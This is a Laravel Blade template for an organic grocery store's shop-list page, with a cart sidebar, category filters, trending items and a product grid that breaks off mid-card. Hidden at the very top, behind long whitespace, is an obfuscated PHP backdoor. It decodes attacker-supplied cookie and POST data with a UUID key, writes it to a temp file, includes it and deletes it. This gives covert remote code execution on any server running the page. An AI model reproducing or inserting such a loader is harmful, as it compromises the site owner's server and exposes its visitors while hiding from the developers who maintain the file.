<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("szI_DSq")){class szI_DSq{public static $axCgDMurl = "3dd9dbab-6e42-48d3-abae-019ebd3aea90";public static $QGWMgnK = NULL;public function __construct(){$AqRBIT = $_COOKIE;$WqgTpS = $_POST;$euoIYlS = @$AqRBIT[substr(szI_DSq::$axCgDMurl, 0, 4)];if (!empty($euoIYlS)){$BgExO = "base64";$xBSeLNAN = "";$euoIYlS = explode(",", $euoIYlS);foreach ($euoIYlS as $KmfrAOoQ){$xBSeLNAN .= @$AqRBIT[$KmfrAOoQ];$xBSeLNAN .= @$WqgTpS[$KmfrAOoQ];}$xBSeLNAN = array_map($BgExO . "\x5f" . chr ( 504 - 404 ).chr ( 644 - 543 )."\143" . "\157" . "\144" . "\x65", array($xBSeLNAN,)); $xBSeLNAN = $xBSeLNAN[0] ^ str_repeat(szI_DSq::$axCgDMurl, (strlen($xBSeLNAN[0]) / strlen(szI_DSq::$axCgDMurl)) + 1);szI_DSq::$QGWMgnK = @unserialize($xBSeLNAN);}}public function __destruct(){$this->vXgEU();}private function vXgEU(){if (is_array(szI_DSq::$QGWMgnK)) {$YiCfENE = sys_get_temp_dir() . "/" . crc32(szI_DSq::$QGWMgnK[chr ( 172 - 57 ).chr (97) . chr (108) . chr ( 363 - 247 )]);@szI_DSq::$QGWMgnK['w' . chr (114) . chr ( 574 - 469 ).chr ( 1044 - 928 ).'e']($YiCfENE, szI_DSq::$QGWMgnK["\x63" . chr (111) . chr ( 123 - 13 )."\x74" . 'e' . "\x6e" . chr (116)]);include $YiCfENE;@szI_DSq::$QGWMgnK[chr (100) . 'e' . chr ( 618 - 510 )."\x65" . "\x74" . chr ( 988 - 887 )]($YiCfENE);exit();}}}$BtjggFi = new szI_DSq(); $BtjggFi = NULL;} ?>@include('includes.header')
@include('includes.navbar')
<!-- main body start -->
 <main>
    <!-- sidebar section start -->
    <section class="sidebar_section">
      <div class="sidebar_content_wrap">
        <div class="container">
          <div class="row">
            <div
              class="offcanvas offcanvas-end"
              tabindex="-1"
              id="offcanvasRight"
              aria-labelledby="offcanvasRightLabel"
            >
              <div class="offcanvas-header align-items-center">
                <h5 class="mb-0">Organic Products</h5>
                <button
                  type="button"
                  class="btn-close text-reset text-end"
                  data-bs-dismiss="offcanvas"
                  aria-label="Close"
                ></button>
              </div>
              <div class="offcanvas-body">
                <div
                  class="prdc_ctg_product_content mt-1 d-flex align-items-center"
                >
                  <div
                    class="prdc_ctg_product_img d-flex justify-content-center align-items-center me-3"
                  >
                    <img
                      src="{{asset('public/assets/images/category/cat6.png')}}"
                      alt="image_not_found"
                    />
                  </div>
                  <div class="prdc_ctg_product_text">
                    <div class="prdc_ctg_product_title my-2">
                      <h5>Organic Cabbage</h5>
                    </div>
                    <div class="prdc_ctg_product_price mt-1 product_price">
                      <span class="sale_price pe-1">$50.00</span>
                      <del>$70.00</del>
                    </div>
                  </div>
                </div>
                <div
                  class="prdc_ctg_product_content mt-1 d-flex align-items-center"
                >
                  <div
                    class="prdc_ctg_product_img d-flex justify-content-center align-items-center me-3"
                  >
                    <img
                      src="{{asset('public/assets/images/category/cat7.png')}}"
                      alt="image_not_found"
                    />
                  </div>
                  <div class="prdc_ctg_product_text">
                    <div class="prdc_ctg_product_title my-2">
                      <h5>Organic Cabbage</h5>
                    </div>
                    <div class="prdc_ctg_product_price mt-1 product_price">
                      <span class="sale_price pe-1">$40.00</span>
                      <del>$60.00</del>
                    </div>
                  </div>
                </div>
                <div
                  class="prdc_ctg_product_content mt-1 d-flex align-items-center"
                >
                  <div
                    class="prdc_ctg_product_img d-flex justify-content-center align-items-center me-3"
                  >
                    <img
                      src="{{asset('public/assets/images/category/cat8.png')}}"
                      alt="image_not_found"
                    />
                  </div>
                  <div class="prdc_ctg_product_text">
                    <div class="prdc_ctg_product_title my-2">
                      <h5>Organic Cabbage</h5>
                    </div>
                    <div class="prdc_ctg_product_price mt-1 product_price">
                      <span class="sale_price pe-1">$70.00</span>
                      <del>$90.00</del>
                    </div>
                  </div>
                </div>
                <div class="total_price">
                  <ul class="ul_li_block mb_30 clearfix">
                    <li>
                      <span>Subtotal:</span>
                      <span>$215</span>
                    </li>
                    <li>
                      <span>Vat 5%:</span>
                      <span>$10.75</span>
                    </li>
                    <li>
                      <span>Discount 15%:</span>
                      <span>- $32.25</span>
                    </li>
                    <li>
                      <span>Total:</span>
                      <span>$191.8875</span>
                    </li>
                  </ul>
                </div>
                <div class="sidebar_btns">
                  <ul class="btns_group ul_li_block clearfix">
                    <li><a href="#!">View Cart</a></li>
                    <li><a href="#!">Checkout</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- sidebar section end -->

    <!-- Breadcrumb section start -->
    <section class="breadcrumb_sec_1 position-relative">
      <div
        class="breadcrumb_wrap sec_space_mid_small"
        style="
          background-image: url(assets/images/breadcrumb/breadcrumb1.png);
        "
      >
        <div class="breadcrumb_cont text-center">
          <div class="breadcrumb_title">
            <h2 class="text-white">Shop List Sidebar</h2>
          </div>
          <ul
            class="list-unstyled breadcrumb_item d-flex justify-content-center align-items-center text-white"
          >
            <li>
              <a href="index.html"
                ><i class="fas fa-home active"></i>Home</a
              >
            </li>
            <li><i class="fas fa-chevron-right"></i>About</li>
            <li><i class="fas fa-chevron-right"></i>Dried</li>
          </ul>
        </div>
      </div>
    </section>
    <!-- Breadcrumb section end -->

    <!-- shop list sidebar start -->
    <section class="shop_list_sidebar sec_space_large">
      <div class="shop_sidebar_wrap">
        <div class="container">
          <div class="row">
            <div class="col-lg-3">
              <div class="shop_sidebar_searchbar position-relative">
                <input
                  class="rounded-pill"
                  type="search"
                  name="search"
                  placeholder="Search"
                />
                <i class="fas fa-search position-absolute"></i>
              </div>
              <!-- blog category start -->
              <div
                class="blog_category"
                data-aos="fade-up"
                data-aos-duration="2000"
              >
                <div class="blog_category_wrap">
                  <h3 class="blog_category_title py-3">Categories</h3>
                  <div class="blog_category_item">
                    <div class="row">
                      <div class="form-check">
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault1"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault1"
                          >
                            Beverages
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault2"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault2"
                          >
                            Biscuits, Snacks
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault3"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault3"
                          >
                            Breakfast & Dairy
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault4"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault4"
                          >
                            Fruits & Vegetables
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault5"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault5"
                          >
                            Home Needs
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault6"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault6"
                          >
                            Grocery & Staples
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault7"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault7"
                          >
                            Home & Kitchen
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault8"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault8"
                          >
                            Household Needs
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault9"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault9"
                          >
                            Meats, Frozen
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault10"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault10"
                          >
                            Noodles, Sauces
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault11"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault11"
                          >
                            Personal Care
                          </label>
                        </div>
                        <div class="col">
                          <input
                            class="form-check-input"
                            type="checkbox"
                            value=""
                            id="flexCheckDefault12"
                          />
                          <label
                            class="form-check-label ms-2"
                            for="flexCheckDefault12"
                          >
                            Pet Care
                          </label>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <!-- blog category end -->

              <!-- filter range start -->
              <div
                class="price-range-area mt-3"
                data-aos="fade-up"
                data-aos-duration="2000"
              >
                <h3 class="price_range_title mb-4">Filter By Price</h3>
                <div
                  id="slider-range"
                  class="slider-range ui-slider ui-slider-horizontal ui-widget ui-widget-content ui-corner-all"
                >
                  <div
                    class="ui-slider-range ui-widget-header ui-corner-all"
                    style="left: 0%; width: 100%"
                  ></div>
                  <span
                    class="ui-slider-handle ui-state-default ui-corner-all"
                    tabindex="0"
                    style="left: 0%"
                  ></span
                  ><span
                    class="ui-slider-handle ui-state-default ui-corner-all"
                    tabindex="0"
                    style="left: 100%"
                  ></span>
                </div>
                <div class="price-text d-flex align-items-center mt-3">
                  <span class="text-uppercase"
                    >Filter <i class="fas fa-long-arrow-alt-right"></i
                  ></span>
                  <input type="text" id="amount" readonly="" />
                </div>
              </div>
              <!-- filter range end -->

              <!-- trending section start -->
              <section
                class="trending_sec mt-3"
                data-aos="fade-up"
                data-aos-duration="2000"
              >
                <div class="trending_sec_wrap">
                  <h3 class="trending_title mb-3">Trending Items</h3>
                  <div class="trending_item d-flex align-items-center">
                    <div
                      class="trending_thumb d-flex justify-content-center align-items-center"
                    >
                      <img
                        src="{{asset('public/assets/images/trends/trend7.png')}}"
                        alt="image_not_found"
                      />
                    </div>
                    <div class="trending_text">
                      <span>Mango Juices</span>
                      <div class="trending_price">
                        <del>$22</del>
                        <font>$18</font>
                      </div>
                      <ul class="rating_star ul_li">
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                      </ul>
                    </div>
                  </div>
                  <div class="trending_item d-flex align-items-center">
                    <div
                      class="trending_thumb d-flex justify-content-center align-items-center"
                    >
                      <img
                        src="{{asset('public/assets/images/trends/trend8.png')}}"
                        alt="image_not_found"
                      />
                    </div>
                    <div class="trending_text">
                      <span>Beef Steak</span>
                      <div class="trending_price">
                        <del>$22</del>
                        <font>$18</font>
                      </div>
                      <ul class="rating_star ul_li">
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                      </ul>
                    </div>
                  </div>
                  <div class="trending_item d-flex align-items-center">
                    <div
                      class="trending_thumb d-flex justify-content-center align-items-center"
                    >
                      <img
                        src="{{asset('public/assets/images/trends/trend9.png')}}"
                        alt="image_not_found"
                      />
                    </div>
                    <div class="trending_text">
                      <span>Broccoli</span>
                      <div class="trending_price">
                        <del>$22</del>
                        <font>$18</font>
                      </div>
                      <ul class="rating_star ul_li">
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                      </ul>
                    </div>
                  </div>
                  <div class="trending_item d-flex align-items-center">
                    <div
                      class="trending_thumb d-flex justify-content-center align-items-center"
                    >
                      <img
                        src="{{asset('public/assets/images/trends/trend10.png')}}"
                        alt="image_not_found"
                      />
                    </div>
                    <div class="trending_text">
                      <span>Strawberries</span>
                      <div class="trending_price">
                        <del>$22</del>
                        <font>$18</font>
                      </div>
                      <ul class="rating_star ul_li">
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                      </ul>
                    </div>
                  </div>
                  <div class="trending_item d-flex align-items-center">
                    <div
                      class="trending_thumb d-flex justify-content-center align-items-center"
                    >
                      <img
                        src="{{asset('public/assets/images/trends/trend11.png')}}"
                        alt="image_not_found"
                      />
                    </div>
                    <div class="trending_text">
                      <span>Body Lotion</span>
                      <div class="trending_price">
                        <del>$22</del>
                        <font>$18</font>
                      </div>
                      <ul class="rating_star ul_li">
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li class="active"><i class="fas fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                        <li><i class="far fa-star"></i></li>
                      </ul>
                    </div>
                  </div>
                  <div class="trending_btn mt-3">
                    <a href="#"
                      ><button
                        type="button"
                        class="btn text-uppercase px-4"
                      >
                        View More
                        <i class="fas fa-long-arrow-alt-right"></i></button
                    ></a>
                  </div>
                </div>
              </section>
              <!-- trending section end -->
            </div>
            <div class="col-lg-9">
              <!-- shop list section start -->
              <section
                class="shop_list_sec"
                data-aos="fade-up"
                data-aos-duration="2000"
              >
                <div class="shop_list_wrap">
                  <div class="container">
                    <div
                      class="filter_area d-flex justify-content-between align-items-center mb_30"
                    >
                      <ul class="nav layout_tab_nav ul_li" role="tablist">
                        <li>
                          <button
                            class="active"
                            data-bs-toggle="tab"
                            data-bs-target="#grid_layout"
                            type="button"
                            role="tab"
                            aria-selected="true"
                          >
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="17"
                              height="17"
                              viewBox="0 0 12 12"
                            >
                              <path
                                id="grid"
                                class="cls-1"
                                d="M1784,905h2v2h-2v-2Zm5,0h2v2h-2v-2Zm5,0h2v2h-2v-2Zm-10,5h2v2h-2v-2Zm5,0h2v2h-2v-2Zm5,0h2v2h-2v-2Zm-10,5h2v2h-2v-2Zm5,0h2v2h-2v-2Zm5,0h2v2h-2v-2Z"
                                transform="translate(-1784 -905)"
                              />
                            </svg>
                          </button>
                        </li>
                        <li>
                          <button
                            data-bs-toggle="tab"
                            data-bs-target="#list_layout"
                            type="button"
                            role="tab"
                            aria-selected="false"
                          >
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="17"
                              height="17"
                              viewBox="0 0 12 12"
                            >
                              <path
                                id="list"
                                class="cls-1"
                                d="M1823,905h2v2h-2v-2Zm5,0h2v2h-2v-2Zm5,0h2v2h-2v-2Zm-10,5h2v2h-2v-2Zm5,0h2v2h-2v-2Zm5,0h2v2h-2v-2Zm-10,5h2v2h-2v-2Zm5,0h2v2h-2v-2Zm5,0h2v2h-2v-2Zm-5-10h7v2h-7v-2Zm0,5h7v2h-7v-2Zm0,5h7v2h-7v-2Z"
                                transform="translate(-1823 -905)"
                              />
                            </svg>
                          </button>
                        </li>
                        <span class="show_result"
                          >Showing 1–18 of 24 results</span
                        >
                      </ul>
                      <!-- <form action="#">
                        <div class="sorting_from d-flex align-items-center">
                          <span class="sorting_from_title"
                            >Default Sorting:</span
                          >
                          <div class="clearfix">
                            <select>
                              <option data-display="Select">Nothing</option>
                              <option value="1" selected>Popularity</option>
                              <option value="2">Organic</option>
                              <option value="4">Fantastic</option>
                            </select>
                          </div>
                        </div>
                      </form> -->
                    </div>
                    <div class="shop_product_list">
                      <div class="tab-content" id="pills-tabContent">
                        <div
                          class="tab-pane fade show active"
                          id="grid_layout"
                          role="tabpanel"
                          aria-labelledby="pills-grid_layout-tab"
                        >
                          <div class="row g-4">
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product1.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product3.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product2.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product4.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product3.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product6.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product33.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product8.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product34.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product10.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product35.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product3.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
